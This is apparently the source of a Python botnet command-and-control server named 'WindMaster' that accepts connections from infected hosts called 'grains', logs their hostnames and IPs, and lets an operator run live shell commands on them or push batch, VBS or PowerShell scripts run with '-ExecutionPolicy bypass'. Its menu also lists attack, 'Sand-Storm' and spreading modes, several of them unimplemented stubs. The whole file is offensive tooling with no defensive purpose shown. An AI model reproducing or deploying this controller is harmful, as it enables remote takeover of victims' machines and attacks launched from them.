import socket
import sys
import threading

total_grains_list = {}
bot_active_conn = {}
keys_lst = ['sand_grain']

server_adr = ""
server_port = 0


# ----- Printing ----- #
def print_menu(menu):
    if menu == 0:
        print('''        [*] Master Menu:
        1. Execute shell command on single / several grains
        2. Pre-defined single grain's endpoint attack
        3. Pre-defined grains' domain attack (on multiply endpoints)
        4. Sand-Storm attack
        5. Spreading options
        6. Print grains status
        7. Terminate\n''')

    # Shell Execution
    if menu == 1:
        print('''1. Execute shell command\n2. Upload script\n3. Back''')


def print_status():
    global total_grains_list, bot_active_conn

    total_count = len(list(total_grains_list.keys()))
    active_count = len(list(bot_active_conn.keys()))

    print("[+] Total Connections Registered: " + str(total_count))
    print("[+] Active Connections: " + str(active_count) + "\n")


# ------------ Network Functionality ------------
def recv_ex(ssocket):
    data, addr = ssocket.recvfrom(2048)
    data = data.decode()

    if "[+]SandEnd[+]" in data:
        data = data.replace("[+]SandStart[+]", "")
        return data.replace("[+]SandEnd[+]", "")

    else:
        main_data = ""
        main_data += data
        data, addr = ssocket.recvfrom(2048)
        data = data.decode()
        main_data += data
        while "[+]SandEnd[+]" not in data:
            data = ssocket.recv(2048)
            data = data.decode()
            main_data += data
        main_data = main_data.replace("[+]SandStart[+]", "")
        return main_data.replace("[+]SandEnd[+]", "")


def send_ex(ssocket, info):
    info = "[+]SandStart[+]" + info + "[+]SandEnd[+]"
    ssocket.send(info.encode())


# ------------ Choosing Live Target ------------
def grain_choose():
    global bot_active_conn

    print("[+] Choose active grains [+]")
    print("1. Single grain")
    print("2. Multiply grains'")

    grain_opt = int(input("Choose Option ~$> "))
    while grain_opt not in [1, 2]:
        print("[!] Invalid option please choose again")
        grain_opt = int(input("Choose Option > "))

    print("     [+] Online grains list [+]")
    for key, value in bot_active_conn.items():
        print("[+] Online: " + key)

    if grain_opt == 1:
        master_input = input("Hostname ~$> ")
        while master_input not in bot_active_conn.keys():
            print("[!] Enter valid input")
            master_input = input("Hostname ~$> ")

        return bot_active_conn[master_input][0]

    else:
        print("Choose hosts with the following syntax 'HOSTNAME;HOSTNAME;...'")
        master_input = input("Hostnames ~$> ")
        ret_lst = {}
        for hostname in master_input.split(";"):
            if hostname not in bot_active_conn.keys():
                print("[!] Hostname " + hostname + " not inside the list")
            else:
                ret_lst[hostname] = bot_active_conn[hostname][0]

        return ret_lst


# ------------ Operational Function ------------
# ------------ Shell Execution ------------
def single_execution_mode(conns, master_input):
    while master_input != 3:
        if master_input > 3 or master_input < 1:
            print("[!] Invalid option")
        else:
            if master_input == 1:
                print("[*] Live Shell - type 'kill_shell' to exit back to the menu")
                grain_command = input("Command~$> ")
                while grain_command != "kill_shell":
                    full_operation = "shell[#grain_op#]" + grain_command
                    try:
                        conns.send(full_operation.encode())
                    except Exception as err:
                        print("[+] Error while sending command: " + str(err))
                    else:
                        try:
                            response = conns.recv(2048)
                            response = response.decode()
                        except Exception as err:
                            print("[!] Error while decoding data: " + str(err) + "[+]")
                            print("[*] Continue collecting data...")
                            response = conns.recv(2048)
                            response = response.decode()
                            print(response)
                        else:
                            print("\n[+] Output:")
                            print(response)
                    grain_command = input("Command~$> ")

            elif master_input == 2:
                script_types_dict = {"batch": "", "powershell": "powershell.exe -ExecutionPolicy bypass ", "vbs": "cscript "}
                print("[*] Scripts Execution [+]")
                print("[*] Usage: script_type::script_path")
                print("[*] Possible scripts types: batch, powershell, vbs")
                grain_command = input("Command ~> ")
                grain_command.split("::")
                with open(grain_command[1], "r") as script_file:
                    script_data = script_file.read()
                    # Add prefix and suffix to data:
                    full_operation = "script[#grain_op#]" + script_types_dict[grain_command[0]] + "[+]SandSplit[+]" + script_data + "[+]SandEnd[+]"
                try:
                    conns.send(full_operation.encode())
                except Exception as err:
                    print("[!] Error while sending script to grain: " + str(err))
                else:
                    response = conns.recv(2048)
                    response = response.decode()
                    print("[+] Response received from the host:\n" + response)

            else:
                break

            print_menu(1)
            master_input = int(input("(⌐■_■)~$> "))


def multiply_execution_mode(conns, master_input):
    while master_input != 3:
        if master_input > 3 or master_input < 1:
            print("[!] Invalid option")
        else:
            if master_input == 1:
                pass

            elif master_input == 2:
                pass

            else:
                break

        print_menu(1)
        master_input = int(input("(⌐■_■)~$> "))


def shell_execution():
    global bot_active_conn

    conns = grain_choose()
    conns_type = True if type(conns).__name__ == "list" else False

    if conns_type:
        print("[+] Multiply Live Shell Mode")
        print_menu(1)

    else:
        print("[+] Single Live Shell Mode")
        print_menu(1)

        # Choosing Input
        try:
            master_input = int(input("(⌐■_■)~$> "))
        except ValueError:
            print("[!] Please use numbers only")
            master_input = input("(⌐■_■)~$> ")
            while not master_input.isdigit():
                print("[!] Please use numbers only")
                master_input = input("(⌐■_■)~$> ")
            master_input = int(master_input)

        # Executing Option for single / multiply host
        if conns_type:
            multiply_execution_mode(conns, master_input)
        else:
            single_execution_mode(conns, master_input)


# ------------ Main Operations Executor ------------
def operation_execution(operation_code):
    if operation_code == 1:
        shell_execution()


# ------------ Core Function ------------
def grains_listener(server_sock):
    global total_grains_list, bot_active_conn, keys_lst

    try:
        while True:
            server_sock.listen()
            conn, address = server_sock.accept()
            key_host = conn.recv(1024)
            key_host = key_host.decode().split(";")
            try:
                if key_host[0] in keys_lst:
                    conn.send("[+] Connection Established".encode())
                    total_grains_list[key_host[1]] = (conn, address)
                    bot_active_conn[key_host[1]] = (conn, address)
                    with open("grains.log", "a") as grains_db_file:
                        grains_db_file.write(key_host[1] + ";" + address[0] + "\n")
                else:
                    conn.send("[!] Connection Failed".encode())
                    conn.close()
            except Exception as err:
                print("[+] Error in listening thread: " + str(err))
    except Exception as err:
        print("[!] General Error in listening thread: " + str(err))


def wind_master_main(main_socket):

    print('''             Welcome Wind_Master ( ͡° ͜ʖ ͡°)
            (-(-_-(-_(-_(-_-)_-)-_-)_-)_-)-)
            
            ''')

    try:
        listener_thread = threading.Thread(target=grains_listener, args=(main_socket,))
        listener_thread.start()
    except Exception as err:
        print("[!] Error starting listener: " + str(err))
    else:
        print("[+] Listener started...")

    print_menu(0)
    master_input = int(input("(⌐■_■)~$> "))

    while master_input != 7:
        if master_input > 7 or master_input < 1:
            print("[!] Options range [1, 7]")
            break
        else:
            operation_execution(master_input)
        master_input = int(input("(⌐■_■)~$> "))
    main_socket.close()


# ----- Main ----- #
if len(sys.argv) > 1:

    server_adr = sys.argv[1]
    server_port = int(sys.argv[2])

    try:
        wm_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        wm_socket.bind((server_adr, server_port))
    except Exception as err:
        print("[!] Error while binding port: " + str(err))
    else:
        print("[+] BIND: " + server_adr + ":" + str(server_port))
        print("[*] WindMaster starting...")
        print("[*] Checking SandBox...")
        with open("grains.log", "r") as grains_file:
            if len(grains_file.read()) > 0:
                grains_file.seek(0, 0)
                for grain in grains_file.readlines():
                    grain = grain.replace("\n", "")
                    grain = grain.split(";")
                    # 0 - Hostname, 1 - IP
                    total_grains_list[grain[0]] = grain[1]
            else:
                print("[*] Sandbox empty")
        print("[+] Wind Master started successfully")
        print_status()
        # WindMaster Started
        wind_master_main(wm_socket)
        try:
            wm_socket.close()
        except Exception as err:
            print("[+] Safe closing response: " + str(err))

else:
    print("[!] Invalid arguments for the WindMaster")
    print("[!] Usage: python -m WindMaster.py SERVER_ADDRESS SERVER_PORT")
